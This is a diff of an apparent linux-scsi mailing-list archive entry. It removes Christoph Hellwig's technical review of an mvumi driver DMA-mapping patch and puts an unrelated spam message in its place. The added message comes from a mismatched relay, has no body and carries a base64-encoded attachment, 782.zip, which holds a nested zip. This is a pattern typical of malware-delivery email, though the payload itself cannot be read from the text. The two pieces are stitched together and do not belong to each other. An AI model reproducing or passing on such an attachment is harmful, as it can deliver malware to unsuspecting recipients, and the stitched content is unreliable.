@@ -1,43 +1,44 @@
-From: Christoph Hellwig <hch@infradead.org>
-Subject: Re: [PATCH] scsi: mvumi: add check for dma mapping errors
-Date: Sun, 23 Apr 2017 01:41:33 -0700
-Message-ID: <20170423084133.GE30869@infradead.org>
-References: <1492816670-25795-1-git-send-email-khoroshilov@ispras.ru>
+From: <eaya@otenet.gr>
+Subject: 21319 linux-scsi
+Date: Sun, 23 Apr 2017 09:29:45 -0000
+Message-ID: <149293978559.20066.15481877427736800720@zaural.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="782.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from bombadil.infradead.org ([65.50.211.133]:42657 "EHLO
-        bombadil.infradead.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1428006AbdDWIlk (ORCPT
-        <rfc822;linux-scsi@vger.kernel.org>); Sun, 23 Apr 2017 04:41:40 -0400
-Content-Disposition: inline
-In-Reply-To: <1492816670-25795-1-git-send-email-khoroshilov@ispras.ru>
+Received: from ws121.zone31-163-138.zaural.ru ([31.163.138.121]:44895 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1044416AbdDWJ3z (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Sun, 23 Apr 2017 05:29:55 -0400
+Content-Disposition: attachment
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: Alexey Khoroshilov <khoroshilov@ispras.ru>
-Cc: "James E.J. Bottomley" <jejb@linux.vnet.ibm.com>, "Martin K. Petersen" <martin.petersen@oracle.com>, linux-scsi@vger.kernel.org, linux-kernel@vger.kernel.org, ldv-project@linuxtesting.org
+To: linux-scsi@vger.kernel.org
 
-On Sat, Apr 22, 2017 at 02:17:50AM +0300, Alexey Khoroshilov wrote:
->  	} else {
-> -		scmd->SCp.dma_handle = scsi_bufflen(scmd) ?
-> -			pci_map_single(mhba->pdev, scsi_sglist(scmd),
-> -				scsi_bufflen(scmd),
-> -				(int) scmd->sc_data_direction)
-> -			: 0;
-> +		if (!scsi_bufflen(scmd))
-> +			return -1;
-> +		scmd->SCp.dma_handle = pci_map_single(mhba->pdev,
-> +						scsi_sglist(scmd),
-> +						scsi_bufflen(scmd),
-> +						(int) scmd->sc_data_direction);
-> +		if (pci_dma_mapping_error(mhba->pdev, scmd->SCp.dma_handle))
-> +			return -1;
-
-This looks completely broken.  Why would you DMA map the in-memory
-struct scatterlist?  It has no meaning for the hardware.
-
-In fact this whole branch (and the equivalent in the unmap path)
-are dead - SCSI commands that transfer data always have a SG entry.
-
-So the right fix is to remove the !scsi_sg_count(scmd) map/unmap
-path.
+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
